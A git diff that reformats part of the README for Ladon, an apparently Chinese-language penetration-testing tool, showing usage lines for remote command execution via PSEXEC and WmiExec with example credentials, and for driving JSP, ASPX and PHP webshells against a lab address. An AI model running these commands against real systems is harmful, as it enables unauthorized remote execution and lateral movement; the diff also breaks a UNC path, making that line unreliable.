@@ -331,11 +331,12 @@ All Version: https://github.com/k8gege/Ladon/releases/
 
 ##### 445端口 PSEXEC远程执行命令（交互式）
 
-net user \\192.168.1.8 k8gege520 /user:k8gege
-`Ladon psexec 192.168.1.8`
+```
+net user \192.168.1.8 k8gege520 /user:k8gege 
+Ladon psexec 192.168.1.8 
+psexec> whoami nt authority\system
+```
 
-psexec> whoami
-nt authority\system
 
 ##### 058 135端口 WmiExec远程执行命令 （非交互式）
 `Ladon wmiexec 192.168.1.8 k8gege k8gege520 whoami`
@@ -352,20 +353,22 @@ nt authority\system
 
 
 ##### 061 JspShell远程执行命令（非交互式）
+
 `Usage：Ladon JspShell type url pwd cmd`
 
 `Example: Ladon JspShell ua http://192.168.1.8/shell.jsp Ladon whoami`
 
 
 #### 062 WebShell远程执行命令（非交互式）
+
 ```Bash
-`Usage：Ladon WebShell ScriptType ShellType url pwd cmd`
+Usage：Ladon WebShell ScriptType ShellType url pwd cmd
 
-`Example: Ladon WebShell jsp ua http://192.168.1.8/shell.jsp Ladon whoami`
+Example: Ladon WebShell jsp ua http://192.168.1.8/shell.jsp Ladon whoami
 
-`Example: Ladon WebShell aspx cd http://192.168.1.8/1.aspx Ladon whoami`
+Example: Ladon WebShell aspx cd http://192.168.1.8/1.aspx Ladon whoami
 
-`Example: Ladon WebShell php ua http://192.168.1.8/1.php Ladon whoami`
+Example: Ladon WebShell php ua http://192.168.1.8/1.php Ladon whoami
 
 ```
 
